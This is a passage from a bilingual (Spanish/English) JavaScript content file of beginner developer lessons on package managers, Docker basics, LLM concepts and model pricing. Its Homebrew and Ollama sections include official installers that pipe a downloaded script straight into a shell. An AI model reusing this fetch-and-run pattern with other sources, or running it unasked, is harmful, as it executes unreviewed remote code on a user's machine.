- ⚡ [Codex CLI](https://openai.com/index/introducing-codex) - OpenAI

**AI Editors:**
- 🌊 [Windsurf](https://codeium.com/windsurf) - Codeium
- 🚀 [Google Antigravity](https://idx.google.com/antigravity) - Google
- 🌐 [Google IDX](https://idx.dev) - Cloud IDE
    `,
  },
  homebrew: {
    contentEs: `
## Instalar software como profesional

Los gestores de paquetes te permiten instalar, actualizar y eliminar software desde la terminal con un solo comando.

---

## Por sistema operativo

| Sistema | Gestor | Instalación |
|---------|--------|-------------|
| **macOS** | Homebrew | Ver abajo |
| **Linux** | apt, dnf, pacman | Ya instalado |
| **Windows** | winget, scoop | winget ya viene incluido |

---

## Homebrew (macOS)

### Instalación

\`\`\`bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
\`\`\`

### Comandos esenciales

\`\`\`bash
# Instalar programa
brew install git

# Instalar app gráfica
brew install --cask visual-studio-code

# Buscar paquetes
brew search docker

# Actualizar todo
brew update && brew upgrade

# Ver instalados
brew list
\`\`\`

---

## Windows: winget

\`\`\`powershell
# Buscar
winget search vscode

# Instalar
winget install Microsoft.VisualStudioCode

# Actualizar todo
winget upgrade --all
\`\`\`

---

## Linux: apt (Ubuntu/Debian)

\`\`\`bash
# Actualizar lista
sudo apt update

# Instalar
sudo apt install git

# Actualizar todo
sudo apt upgrade
\`\`\`

---

## Qué instalar primero

\`\`\`bash
# macOS
brew install git node pnpm python

# Windows
winget install Git.Git OpenJS.NodeJS Python.Python.3

# Linux
sudo apt install git nodejs npm python3
\`\`\`

---

## Enlaces útiles

- 📖 [Homebrew](https://brew.sh/)
- 📖 [Winget Docs](https://learn.microsoft.com/en-us/windows/package-manager/winget/)
    `,
    contentEn: `
## Install software like a pro

Package managers let you install, update, and remove software from the terminal with a single command.

---

## By operating system

| System | Manager | Installation |
|--------|---------|--------------|
| **macOS** | Homebrew | See below |
| **Linux** | apt, dnf, pacman | Already installed |
| **Windows** | winget, scoop | winget comes included |

---

## Homebrew (macOS)

### Installation

\`\`\`bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
\`\`\`

### Essential commands

\`\`\`bash
# Install program
brew install git

# Install GUI app
brew install --cask visual-studio-code

# Search packages
brew search docker

# Update everything
brew update && brew upgrade

# List installed
brew list
\`\`\`

---

## Windows: winget

\`\`\`powershell
# Search
winget search vscode

# Install
winget install Microsoft.VisualStudioCode

# Update everything
winget upgrade --all
\`\`\`

---

## Linux: apt (Ubuntu/Debian)

\`\`\`bash
# Update list
sudo apt update

# Install
sudo apt install git

# Upgrade everything
sudo apt upgrade
\`\`\`

---

## What to install first

\`\`\`bash
# macOS
brew install git node pnpm python

# Windows
winget install Git.Git OpenJS.NodeJS Python.Python.3

# Linux
sudo apt install git nodejs npm python3
\`\`\`

---

## Useful links

- 📖 [Homebrew](https://brew.sh/)
- 📖 [Winget Docs](https://learn.microsoft.com/en-us/windows/package-manager/winget/)
    `,
  },
  'docker-intro': {
    contentEs: `
## ¿Qué problema resuelve Docker?

Imagina este escenario (que pasa TODO el tiempo):

| Situación | Lo que escuchas |
|-----------|-----------------|
| Desarrollador | "En mi máquina funciona perfecto" |
| Servidor de producción | Error 500, crash, dependencias faltantes |
| Nuevo desarrollador | "Llevo 2 días configurando el entorno" |
| DevOps | "¿Qué versión de Node usaste? ¿Y de Python?" |

**Docker resuelve esto** empaquetando tu aplicación CON TODO lo que necesita: código, runtime, librerías, configuración. Si funciona en Docker, funciona en cualquier lado.

---

## 🖥️ Máquinas Virtuales vs Contenedores

\`\`\`
    MÁQUINA VIRTUAL                    CONTENEDOR (DOCKER)
    ─────────────────                  ────────────────────

    ┌─────────────────┐               ┌──────┐ ┌──────┐ ┌──────┐
    │      App        │               │ App1 │ │ App2 │ │ App3 │
    ├─────────────────┤               ├──────┴─┴──────┴─┴──────┤
    │  Libs/Binaries  │               │     Libs/Binaries      │
    ├─────────────────┤               ├────────────────────────┤
    │   Guest OS      │  ← SO completo│     Docker Engine      │
    │  (Ubuntu 8GB)   │               │       (~100MB)         │
    ├─────────────────┤               ├────────────────────────┤
    │   Hypervisor    │               │        Host OS         │
    ├─────────────────┤               ├────────────────────────┤
    │    Host OS      │               │       Hardware         │
    ├─────────────────┤               └────────────────────────┘
    │   Hardware      │
    └─────────────────┘

    🐢 Pesado: 10-20 GB por VM        🚀 Ligero: 100-500 MB
    ⏱️ Boot: 1-2 minutos              ⏱️ Boot: 1-2 segundos
    📦 Aislamiento completo           📦 Aislamiento a nivel proceso
\`\`\`

---

## 💰 Ahorro de recursos

| Métrica | VM Tradicional | Contenedor Docker |
|---------|----------------|-------------------|
| **RAM por instancia** | 1-8 GB | 50-500 MB |
| **Disco** | 10-40 GB | 100 MB - 2 GB |
| **Tiempo de inicio** | 30s - 2min | 1-5 segundos |
| **Apps por servidor** | 5-10 VMs | 50-100+ contenedores |
| **CPU overhead** | 15-20% | 1-5% |

> 💡 **En un servidor con 32GB RAM**: puedes correr ~4 VMs o ~50 contenedores haciendo lo mismo.

---

## ¿Por qué es esencial para el desarrollador moderno?

| Uso | Beneficio |
|-----|-----------|
| **Desarrollo local** | El mismo entorno que producción |
| **Onboarding** | Nuevo dev productivo en minutos, no días |
| **CI/CD** | Tests en ambiente idéntico a producción |
| **Microservicios** | Cada servicio en su contenedor |
| **Experimentar** | Probar tecnologías sin ensuciar tu sistema |
| **Escalabilidad** | Kubernetes orquesta miles de contenedores |

---

## 🔧 Alternativas a Docker

Docker popularizó los contenedores, pero no es la única opción:

| Tecnología | Creador | Características |
|------------|---------|-----------------|
| **Docker** | Docker Inc | El más popular, Docker Hub, Docker Desktop |
| **Podman** | Red Hat | Sin daemon, rootless, compatible con Docker CLI |
| **containerd** | CNCF | Runtime usado por Docker y Kubernetes |
| **LXC/LXD** | Canonical | Contenedores de sistema (más parecido a VMs) |
| **Colima** | Open Source | Docker en macOS/Linux sin Docker Desktop |

> 💡 **Tip**: Si usas Linux y quieres evitar Docker Desktop, **Podman** es la alternativa más popular. Los comandos son casi idénticos: \`podman run\` en lugar de \`docker run\`.

---

## Conceptos clave

| Concepto | Qué es | Analogía |
|----------|--------|----------|
| **Imagen** | Plantilla inmutable | Receta escrita |
| **Contenedor** | Instancia de una imagen | Platillo preparado |
| **Dockerfile** | Instrucciones para crear imagen | Pasos de la receta |
| **Registry** | Repositorio de imágenes | Biblioteca de recetas |
| **Volumen** | Datos persistentes | Ingredientes que guardas |
| **Red** | Comunicación entre contenedores | Conexión entre cocinas |

---

## Instalación

| Sistema | Opción recomendada | Alternativa ligera |
|---------|-------------------|-------------------|
| **macOS** | \`brew install --cask docker\` | Colima + Docker CLI |
| **Windows** | Docker Desktop (WSL2) | Podman Desktop |
| **Linux** | Docker Engine | Podman (sin daemon) |

\`\`\`bash
# Verificar instalación
docker --version
docker run hello-world
\`\`\`

---

## Ciclo de vida de un contenedor

\`\`\`
    Dockerfile     docker build      Imagen        docker run      Contenedor
    ──────────  ─────────────────▶  ────────  ───────────────────▶  ──────────
    (receta)                        (platillo                       (servido)
                                    congelado)

    docker push                     docker pull
    ───────────▶ Docker Hub ◀───────────────────
                 (registro)
\`\`\`

---

## Tu primer contenedor

\`\`\`bash
# Prueba que Docker funciona
docker run hello-world

# Ejecutar Ubuntu interactivo
docker run -it ubuntu bash

# Dentro del contenedor:
cat /etc/os-release  # Ubuntu!
exit                 # Salir
\`\`\`

---

## Comandos esenciales

\`\`\`bash
# ===== CONTENEDORES =====
docker ps                    # Ver corriendo
docker ps -a                 # Ver todos
docker run -d nginx          # Ejecutar en background
docker run -p 8080:80 nginx  # Mapear puerto
docker stop <id>             # Parar
docker rm <id>               # Eliminar
docker logs <id>             # Ver logs
docker exec -it <id> bash    # Entrar a contenedor

# ===== IMÁGENES =====
docker images                # Ver imágenes locales
docker pull node:20          # Descargar imagen
docker rmi <imagen>          # Eliminar imagen

# ===== LIMPIEZA =====
docker system prune          # Eliminar todo lo no usado
\`\`\`

---

## Ejemplo práctico: Servidor web en 10 segundos

\`\`\`bash
# Nginx sirviendo archivos de tu carpeta actual
docker run -d -p 8080:80 -v $(pwd):/usr/share/nginx/html nginx

# Abre http://localhost:8080
\`\`\`

---

## Tu primer Dockerfile

\`\`\`dockerfile
# Imagen base
FROM node:20-alpine

# Directorio de trabajo
WORKDIR /app

# Copiar dependencias primero (mejor cache)
COPY package*.json ./
RUN npm ci

# Copiar código
COPY . .

# Puerto que expone
EXPOSE 3000

# Comando al iniciar
CMD ["npm", "start"]
\`\`\`

\`\`\`bash
# Construir imagen
docker build -t mi-app .

# Ejecutar
docker run -p 3000:3000 mi-app
\`\`\`

---

## Casos de uso comunes

\`\`\`bash
# Base de datos PostgreSQL (datos persistentes)
docker run -d \\
  --name postgres \\
  -e POSTGRES_PASSWORD=secreto \\
  -v pgdata:/var/lib/postgresql/data \\
  -p 5432:5432 \\
  postgres:16

# Redis para cache
docker run -d --name redis -p 6379:6379 redis:alpine

# Adminer (interfaz web para DBs)
docker run -d -p 8081:8080 adminer
\`\`\`

---

## ¿Cuándo NO usar Docker?

| Situación | Por qué |
|-----------|---------|
| Apps GUI desktop | Docker es para servicios, no para apps visuales |
| Máximo rendimiento | El overhead es mínimo pero existe |
| Scripts simples | Overkill para un script de 10 líneas |
| Hardware específico | GPUs requieren configuración extra |

---

## Siguiente nivel

→ [Docker Compose](/es/learning/docker-compose) — Orquesta múltiples contenedores

---

## 🍳 Practica

→ [Docker Hello World](/es/cooking/docker-hello) — Tu primer contenedor

---

## Enlaces útiles

- 📖 [Docker Docs](https://docs.docker.com/)
- 📖 [Podman](https://podman.io/) — Alternativa de Red Hat
- 🎓 [Docker Getting Started](https://docs.docker.com/get-started/)
- 📖 [Awesome Docker](https://github.com/veggiemonk/awesome-docker)
    `,
    contentEn: `
## What problem does Docker solve?

Imagine this scenario (which happens ALL the time):

| Situation | What you hear |
|-----------|---------------|
| Developer | "It works perfectly on my machine" |
| Production server | Error 500, crash, missing dependencies |
| New developer | "I've spent 2 days setting up the environment" |
| DevOps | "What Node version did you use? And Python?" |

**Docker solves this** by packaging your application WITH EVERYTHING it needs: code, runtime, libraries, configuration. If it works in Docker, it works anywhere.

---

## 🖥️ Virtual Machines vs Containers

\`\`\`
    VIRTUAL MACHINE                    CONTAINER (DOCKER)
    ───────────────                    ──────────────────

    ┌─────────────────┐               ┌──────┐ ┌──────┐ ┌──────┐
    │      App        │               │ App1 │ │ App2 │ │ App3 │
    ├─────────────────┤               ├──────┴─┴──────┴─┴──────┤
    │  Libs/Binaries  │               │     Libs/Binaries      │
    ├─────────────────┤               ├────────────────────────┤
    │   Guest OS      │  ← Full OS    │     Docker Engine      │
    │  (Ubuntu 8GB)   │               │       (~100MB)         │
    ├─────────────────┤               ├────────────────────────┤
    │   Hypervisor    │               │        Host OS         │
    ├─────────────────┤               ├────────────────────────┤
    │    Host OS      │               │       Hardware         │
    ├─────────────────┤               └────────────────────────┘
    │   Hardware      │
    └─────────────────┘

    🐢 Heavy: 10-20 GB per VM         🚀 Light: 100-500 MB
    ⏱️ Boot: 1-2 minutes              ⏱️ Boot: 1-2 seconds
    📦 Full isolation                 📦 Process-level isolation
\`\`\`

---

## 💰 Resource savings

| Metric | Traditional VM | Docker Container |
|--------|----------------|------------------|
| **RAM per instance** | 1-8 GB | 50-500 MB |
| **Disk** | 10-40 GB | 100 MB - 2 GB |
| **Startup time** | 30s - 2min | 1-5 seconds |
| **Apps per server** | 5-10 VMs | 50-100+ containers |
| **CPU overhead** | 15-20% | 1-5% |

> 💡 **On a 32GB RAM server**: you can run ~4 VMs or ~50 containers doing the same thing.

---

## Why is it essential for the modern developer?

| Use | Benefit |
|-----|---------|
| **Local development** | Same environment as production |
| **Onboarding** | New dev productive in minutes, not days |
| **CI/CD** | Tests in identical environment to production |
| **Microservices** | Each service in its container |
| **Experimenting** | Try technologies without polluting your system |
| **Scalability** | Kubernetes orchestrates thousands of containers |

---

## 🔧 Docker alternatives

Docker popularized containers, but it's not the only option:

| Technology | Creator | Characteristics |
|------------|---------|-----------------|
| **Docker** | Docker Inc | Most popular, Docker Hub, Docker Desktop |
| **Podman** | Red Hat | Daemonless, rootless, Docker CLI compatible |
| **containerd** | CNCF | Runtime used by Docker and Kubernetes |
| **LXC/LXD** | Canonical | System containers (more like VMs) |
| **Colima** | Open Source | Docker on macOS/Linux without Docker Desktop |

> 💡 **Tip**: If you use Linux and want to avoid Docker Desktop, **Podman** is the most popular alternative. Commands are almost identical: \`podman run\` instead of \`docker run\`.

---

## Key concepts

| Concept | What it is | Analogy |
|---------|------------|---------|
| **Image** | Immutable template | Written recipe |
| **Container** | Instance of an image | Prepared dish |
| **Dockerfile** | Instructions to create image | Recipe steps |
| **Registry** | Image repository | Recipe library |
| **Volume** | Persistent data | Ingredients you save |
| **Network** | Communication between containers | Connection between kitchens |

---

## Installation

| System | Recommended option | Lightweight alternative |
|--------|-------------------|------------------------|
| **macOS** | \`brew install --cask docker\` | Colima + Docker CLI |
| **Windows** | Docker Desktop (WSL2) | Podman Desktop |
| **Linux** | Docker Engine | Podman (daemonless) |

\`\`\`bash
# Verify installation
docker --version
docker run hello-world
\`\`\`

---

## Container lifecycle

\`\`\`
    Dockerfile     docker build      Image         docker run      Container
    ──────────  ─────────────────▶  ────────  ───────────────────▶  ──────────
    (recipe)                        (frozen                         (served)
                                    dish)

    docker push                     docker pull
    ───────────▶ Docker Hub ◀───────────────────
                 (registry)
\`\`\`

---

## Your first container

\`\`\`bash
# Test that Docker works
docker run hello-world

# Run Ubuntu interactively
docker run -it ubuntu bash

# Inside the container:
cat /etc/os-release  # Ubuntu!
exit                 # Exit
\`\`\`

---

## Essential commands

\`\`\`bash
# See running containers
docker ps

# See all containers
docker ps -a

# See downloaded images
docker images

# Run with interactive shell
docker run -it ubuntu bash

# Stop container
docker stop <container_id>

# Remove container
docker rm <container_id>
\`\`\`

---

## Practical example: Node.js

\`\`\`bash
# Run Node.js 20
docker run -it node:20 node

# Now you can write JavaScript
> console.log("Hello from Docker!")
\`\`\`

---

## Your first Dockerfile

\`\`\`dockerfile
FROM node:20
WORKDIR /app
COPY . .
RUN npm install
CMD ["npm", "start"]
\`\`\`

\`\`\`bash
# Build image
docker build -t my-app .

# Run
docker run -p 3000:3000 my-app
\`\`\`

---

## Practice

→ [Docker Hello World](/en/cooking/docker-hello) — Your first container

---

## Useful links

- 📖 [Docker Docs](https://docs.docker.com/)
- 🎓 [Docker Getting Started](https://docs.docker.com/get-started/)
    `,
  },
  llms_intro: {
    contentEs: `
## ¿Qué es un LLM?

**LLM** = Large Language Model (Modelo de Lenguaje Grande)

Es un programa entrenado con millones de textos que puede entender y generar lenguaje humano. Incluyendo código.

> **Lo importante**: Un LLM puede escribir código por ti. Solo tienes que pedírselo bien.

---

## El concepto "Prompt-First"

En lugar de memorizar sintaxis y copiar código de Stack Overflow, puedes:

1. **Describir** lo que quieres en lenguaje natural
2. **Pedir** que el LLM escriba el código
3. **Ejecutar** el código que te dio
4. **Iterar** si algo no funciona

Esto funciona con cualquier LLM: Gemini, ChatGPT, Claude, etc.

---

## ¿Dónde puedo usar un LLM?

| Opción | Acceso | Costo | Ideal para |
|--------|--------|-------|------------|
| [Google AI Studio](https://aistudio.google.com) | Cuenta Google | Gratis | Empezar rápido |
| [ChatGPT](https://chat.openai.com) | Cuenta OpenAI | Gratis/Pago | Uso general |
| [Claude.ai](https://claude.ai) | Cuenta Anthropic | Gratis/Pago | Código y razonamiento |
| [Ollama](https://ollama.ai) | Tu computadora | Gratis | Privacidad total |

> 💡 **Recomendación**: Empieza con Google AI Studio. Es gratis, no pide tarjeta, y ya tienes cuenta.

---

## Los principales LLMs (2026)

| Modelo | Empresa | Fortaleza |
|--------|---------|-----------|
| **Gemini** | Google | Gratis, multimodal, API fácil |
| **Claude** | Anthropic | Excelente para código, razonamiento |
| **GPT-4** | OpenAI | Versátil, amplio conocimiento |
| **Llama** | Meta | Open source, corre local |

---

## ¿Qué es una API Key?

Cuando usas un LLM desde tu código (no desde el chat web), necesitas una **API Key**.

Es como una contraseña que identifica quién está usando el servicio.

| Servicio | Dónde obtenerla |
|----------|-----------------|
| Gemini | [aistudio.google.com/apikey](https://aistudio.google.com/apikey) |
| Claude | [console.anthropic.com](https://console.anthropic.com) |
| OpenAI | [platform.openai.com/api-keys](https://platform.openai.com/api-keys) |

> ⚠️ **Nunca compartas tu API Key** ni la subas a GitHub.

---

## Conceptos clave

| Concepto | Qué es | Ejemplo |
|----------|--------|---------|
| **Prompt** | Lo que le pides al modelo | "Escribe un chatbot en Node.js" |
| **Response** | Lo que el modelo responde | El código + explicación |
| **Token** | Unidad de texto (~4 caracteres) | "Hola" = 1 token |
| **Context** | Lo que el modelo "recuerda" | Conversación anterior |

---

## Practica

→ [Chatbot con Gemini](/es/cooking/chatbot-gemini) — Tu primer proyecto con IA

---

## Enlaces útiles

- 📖 [Google AI Studio](https://aistudio.google.com)
- 📖 [Anthropic API Docs](https://docs.anthropic.com/)
- 🎓 [Prompt Engineering Guide](https://www.promptingguide.ai/)
    `,
    contentEn: `
## What is an LLM?

**LLM** = Large Language Model

It's a program trained on millions of texts that can understand and generate human language. Including code.

> **The key insight**: An LLM can write code for you. You just have to ask properly.

---

## The "Prompt-First" concept

Instead of memorizing syntax and copying code from Stack Overflow, you can:

1. **Describe** what you want in natural language
2. **Ask** the LLM to write the code
3. **Run** the code it gives you
4. **Iterate** if something doesn't work

This works with any LLM: Gemini, ChatGPT, Claude, etc.

---

## Where can I use an LLM?

| Option | Access | Cost | Ideal for |
|--------|--------|------|-----------|
| [Google AI Studio](https://aistudio.google.com) | Google account | Free | Getting started |
| [ChatGPT](https://chat.openai.com) | OpenAI account | Free/Paid | General use |
| [Claude.ai](https://claude.ai) | Anthropic account | Free/Paid | Code and reasoning |
| [Ollama](https://ollama.ai) | Your computer | Free | Total privacy |

> 💡 **Recommendation**: Start with Google AI Studio. It's free, no credit card, and you already have an account.

---

## Main LLMs (2026)

| Model | Company | Strength |
|-------|---------|----------|
| **Gemini** | Google | Free, multimodal, easy API |
| **Claude** | Anthropic | Excellent for code, reasoning |
| **GPT-4** | OpenAI | Versatile, broad knowledge |
| **Llama** | Meta | Open source, runs locally |

---

## What is an API Key?

When you use an LLM from your code (not from the web chat), you need an **API Key**.

It's like a password that identifies who is using the service.

| Service | Where to get it |
|---------|-----------------|
| Gemini | [aistudio.google.com/apikey](https://aistudio.google.com/apikey) |
| Claude | [console.anthropic.com](https://console.anthropic.com) |
| OpenAI | [platform.openai.com/api-keys](https://platform.openai.com/api-keys) |

> ⚠️ **Never share your API Key** or upload it to GitHub.

---

## Key concepts

| Concept | What it is | Example |
|---------|------------|---------|
| **Prompt** | What you ask the model | "Write a chatbot in Node.js" |
| **Response** | What the model answers | The code + explanation |
| **Token** | Unit of text (~4 characters) | "Hello" = 1 token |
| **Context** | What the model "remembers" | Previous conversation |

---

## Practice

→ [Chatbot with Gemini](/en/cooking/chatbot-gemini) — Your first AI project

---

## Useful links

- 📖 [Google AI Studio](https://aistudio.google.com)
- 📖 [Anthropic API Docs](https://docs.anthropic.com/)
- 🎓 [Prompt Engineering Guide](https://www.promptingguide.ai/)
    `,
  },
  'llms-models': {
    contentEs: `
## Dos tipos de modelos, dos propósitos

Cuando desarrollas con IA, usas modelos en **dos contextos muy diferentes**:

| Contexto | Qué hace | Ejemplo |
|----------|----------|---------|
| **Agente de código** | Escribe TU código | Claude Code, Cursor, Copilot |
| **Tu aplicación** | Responde a TUS usuarios | El chatbot que construyes |

> ⚠️ **Error común**: Usar el mismo modelo para ambos. Un modelo caro que escribe código excelente puede ser innecesario (y costoso) para responder preguntas simples de usuarios.

---

## Modelos para agentes de código (Enero 2026)

Estos modelos potencian las herramientas que TÚ usas para programar:

| Modelo | Agente que lo usa | SWE-bench | Contexto | Precio Input/Output |
|--------|-------------------|-----------|----------|---------------------|
| **Claude Opus 4.5** | Claude Code | 72.0% | 200K | $5 / $25 por 1M tokens |
| **GPT-5.2-Codex** | Codex CLI, Copilot | 69.5% | 128K | $6 / $30 por 1M tokens |
| **Claude Sonnet 4** | Cursor, Cody | 72.7% | 200K | $3 / $15 por 1M tokens |
| **Gemini 2.5 Pro** | Google Antigravity | 63.8% | 1M | $1.25 / $5 por 1M tokens |

> 💡 **SWE-bench** mide qué tan bien un modelo resuelve bugs reales de GitHub. Mayor % = mejor para código.

---

## Modelos para producción (Enero 2026)

Estos modelos van **dentro de tu app** para atender usuarios:

| Modelo | Proveedor | Fortaleza | Contexto | Precio Input/Output |
|--------|-----------|-----------|----------|---------------------|
| **Gemini 2.0 Flash** | Google | Muy rápido, gratis hasta 1500/día | 1M | $0.10 / $0.40 por 1M |
| **GLM-4.7** | Zhipu AI | Open source, muy capaz | 200K | Gratis (local) / ~$0.50 via API |
| **DeepSeek-V3.2** | DeepSeek | Excelente calidad/precio | 128K | $0.14 / $0.28 por 1M |
| **Claude 3.5 Haiku** | Anthropic | Rápido, económico | 200K | $0.80 / $4 por 1M |
| **Llama 3.3 70B** | Meta | Open source, corre local | 128K | Gratis (local) |

---

## ¿Por qué importa el contexto (context window)?

El **contexto** es cuánta información puede "ver" el modelo en una sola conversación.

\`\`\`
┌─────────────────────────────────────────────────────┐
│  Contexto = Prompt + Historial + Archivos + Output  │
└─────────────────────────────────────────────────────┘

Modelo con 8K contexto:   [████____] Solo 8,000 tokens
Modelo con 128K contexto: [████████████████████████████████] 128,000 tokens
Modelo con 1M contexto:   [███████████████████████████████████████...] 1,000,000 tokens
\`\`\`

| Caso de uso | Contexto mínimo recomendado |
|-------------|------------------------------|
| Chat simple (FAQ) | 8K |
| Análisis de documentos | 32K-128K |
| Agente de código (lee tu repo) | 128K-200K |
| Analizar codebase completo | 1M+ |

---

## Modelos Open Source: La alternativa gratuita

No necesitas pagar APIs. Puedes correr modelos localmente o usar servicios como OpenRouter.

### Opción 1: Correr local con Ollama

\`\`\`bash
# Instalar Ollama
curl -fsSL https://ollama.com/install.sh | sh

# Descargar y correr GLM-4
ollama run glm4

# O DeepSeek
ollama run deepseek-v3
\`\`\`

**Requisitos**: GPU con 8GB+ VRAM para modelos pequeños, 24GB+ para los grandes.

### Opción 2: OpenRouter (API unificada)

[OpenRouter](https://openrouter.ai) te da acceso a **todos los modelos** con una sola API Key:

\`\`\`javascript
// Usar cualquier modelo con OpenRouter
const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer TU_OPENROUTER_KEY',
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    model: 'deepseek/deepseek-chat-v3',  // O cualquier otro
    messages: [{ role: 'user', content: 'Hola!' }],
  }),
});
\`\`\`

**Modelos populares en OpenRouter (Enero 2026)**:

| Modelo | ID en OpenRouter | Precio/1M tokens |
|--------|------------------|------------------|
| DeepSeek V3.2 | \`deepseek/deepseek-chat-v3\` | $0.14 input / $0.28 output |
| GLM-4.7 | \`zhipu/glm-4\` | $0.50 input / $0.50 output |
| Llama 3.3 70B | \`meta-llama/llama-3.3-70b\` | $0.40 input / $0.40 output |
| Mistral Large 2 | \`mistralai/mistral-large-2\` | $2 input / $6 output |

---

## Comparativa: ¿Qué modelo para qué?

| Necesito... | Recomendación | Por qué |
|-------------|---------------|---------|
| **Escribir código rápido** | Claude Sonnet 4 (vía Cursor) | Balance calidad/velocidad |
| **Tareas de código complejas** | Claude Opus 4.5 (vía Claude Code) | Mejor razonamiento |
| **Chatbot para mi app (gratis)** | Gemini 2.0 Flash | 1500 req/día gratis |
| **Chatbot de alta calidad** | Claude 3.5 Haiku | Rápido y capaz |
| **Máxima privacidad** | Llama 3.3 local | Corre en tu máquina |
| **Presupuesto muy bajo** | DeepSeek V3.2 | Excelente calidad/precio |

---

## Flujo de trabajo real

\`\`\`
1. DESARROLLANDO (tu computadora)
   └── Usas Claude Code o Cursor
       └── Modelo: Claude Opus 4.5 / Sonnet 4
       └── Costo: ~$0.50-2 por sesión de trabajo

2. EN PRODUCCIÓN (tu app)
   └── Tu chatbot responde a usuarios
       └── Modelo: Gemini Flash o DeepSeek
       └── Costo: ~$0.01-0.10 por 1000 usuarios/día
\`\`\`

> 💡 **La clave**: Usa modelos premium para CREAR código, modelos económicos para SERVIR usuarios.

---

## Errores comunes

| Error | Consecuencia | Solución |
|-------|--------------|----------|
| Usar Opus 4.5 en producción | Costos altísimos | Usar Haiku o Flash |
| Usar modelo pequeño para código | Código de mala calidad | Invertir en buen modelo de desarrollo |
| Ignorar contexto | Se "olvida" conversación | Elegir modelo con contexto adecuado |
| No usar OpenRouter | Atado a un proveedor | Centralizar con OpenRouter |

---

## Practica

→ [Chatbot con Gemini](/es/cooking/chatbot-gemini) — Usa Gemini Flash gratis
→ [API con Node](/es/cooking/api-rest-node) — Backend para tu modelo

---

## Enlaces útiles

- 📖 [OpenRouter - Modelos disponibles](https://openrouter.ai/models)
- 📖 [Ollama - Models Library](https://ollama.com/library)
- 📖 [Artificial Analysis - LLM Benchmarks](https://artificialanalysis.ai/)
- 📖 [SWE-bench Leaderboard](https://www.swebench.com/)
- 📖 [Anthropic Pricing](https://www.anthropic.com/pricing)
- 📖 [Google AI Pricing](https://ai.google.dev/pricing)
    `,
    contentEn: `
## Two types of models, two purposes

When developing with AI, you use models in **two very different contexts**:

| Context | What it does | Example |
|---------|--------------|---------|
| **Coding agent** | Writes YOUR code | Claude Code, Cursor, Copilot |
| **Your application** | Responds to YOUR users | The chatbot you're building |

> ⚠️ **Common mistake**: Using the same model for both. An expensive model that writes excellent code may be unnecessary (and costly) for answering simple user questions.

---

## Models for coding agents (January 2026)

These models power the tools YOU use to program:

| Model | Agent using it | SWE-bench | Context | Price Input/Output |
|-------|----------------|-----------|---------|---------------------|
| **Claude Opus 4.5** | Claude Code | 72.0% | 200K | $5 / $25 per 1M tokens |
| **GPT-5.2-Codex** | Codex CLI, Copilot | 69.5% | 128K | $6 / $30 per 1M tokens |
| **Claude Sonnet 4** | Cursor, Cody | 72.7% | 200K | $3 / $15 per 1M tokens |
| **Gemini 2.5 Pro** | Google Antigravity | 63.8% | 1M | $1.25 / $5 per 1M tokens |

> 💡 **SWE-bench** measures how well a model solves real GitHub bugs. Higher % = better for code.

---

## Models for production (January 2026)

These models go **inside your app** to serve users:

| Model | Provider | Strength | Context | Price Input/Output |
|-------|----------|----------|---------|---------------------|
| **Gemini 2.0 Flash** | Google | Very fast, free up to 1500/day | 1M | $0.10 / $0.40 per 1M |
| **GLM-4.7** | Zhipu AI | Open source, very capable | 200K | Free (local) / ~$0.50 via API |
| **DeepSeek-V3.2** | DeepSeek | Excellent quality/price | 128K | $0.14 / $0.28 per 1M |
| **Claude 3.5 Haiku** | Anthropic | Fast, economical | 200K | $0.80 / $4 per 1M |
| **Llama 3.3 70B** | Meta | Open source, runs locally | 128K | Free (local) |

---

## Why does context (context window) matter?

The **context** is how much information the model can "see" in a single conversation.

\`\`\`
┌─────────────────────────────────────────────────────┐
│  Context = Prompt + History + Files + Output        │
└─────────────────────────────────────────────────────┘

Model with 8K context:   [████____] Only 8,000 tokens
Model with 128K context: [████████████████████████████████] 128,000 tokens
Model with 1M context:   [███████████████████████████████████████...] 1,000,000 tokens
\`\`\`

| Use case | Minimum recommended context |
|----------|------------------------------|
| Simple chat (FAQ) | 8K |
| Document analysis | 32K-128K |
| Code agent (reads your repo) | 128K-200K |
| Analyze complete codebase | 1M+ |

---

## Open Source Models: The free alternative

You don't need to pay for APIs. You can run models locally or use services like OpenRouter.

### Option 1: Run locally with Ollama

\`\`\`bash
# Install Ollama
curl -fsSL https://ollama.com/install.sh | sh

# Download and run GLM-4
ollama run glm4

# Or DeepSeek
ollama run deepseek-v3
\`\`\`

**Requirements**: GPU with 8GB+ VRAM for small models, 24GB+ for large ones.

### Option 2: OpenRouter (unified API)

[OpenRouter](https://openrouter.ai) gives you access to **all models** with a single API Key:

\`\`\`javascript
// Use any model with OpenRouter
const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer YOUR_OPENROUTER_KEY',
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    model: 'deepseek/deepseek-chat-v3',  // Or any other
    messages: [{ role: 'user', content: 'Hello!' }],
  }),
});
\`\`\`

**Popular models on OpenRouter (January 2026)**:

| Model | OpenRouter ID | Price/1M tokens |
|-------|---------------|------------------|
| DeepSeek V3.2 | \`deepseek/deepseek-chat-v3\` | $0.14 input / $0.28 output |
| GLM-4.7 | \`zhipu/glm-4\` | $0.50 input / $0.50 output |
| Llama 3.3 70B | \`meta-llama/llama-3.3-70b\` | $0.40 input / $0.40 output |
| Mistral Large 2 | \`mistralai/mistral-large-2\` | $2 input / $6 output |

---

## Comparison: Which model for what?

| I need... | Recommendation | Why |
|-----------|----------------|-----|
| **Fast code writing** | Claude Sonnet 4 (via Cursor) | Balance quality/speed |
| **Complex coding tasks** | Claude Opus 4.5 (via Claude Code) | Best reasoning |
| **Chatbot for my app (free)** | Gemini 2.0 Flash | 1500 req/day free |
| **High-quality chatbot** | Claude 3.5 Haiku | Fast and capable |
| **Maximum privacy** | Llama 3.3 local | Runs on your machine |
| **Very low budget** | DeepSeek V3.2 | Excellent quality/price |

---

## Real workflow

\`\`\`
1. DEVELOPING (your computer)
   └── You use Claude Code or Cursor
       └── Model: Claude Opus 4.5 / Sonnet 4
       └── Cost: ~$0.50-2 per work session

2. IN PRODUCTION (your app)
   └── Your chatbot responds to users
       └── Model: Gemini Flash or DeepSeek
       └── Cost: ~$0.01-0.10 per 1000 users/day
\`\`\`

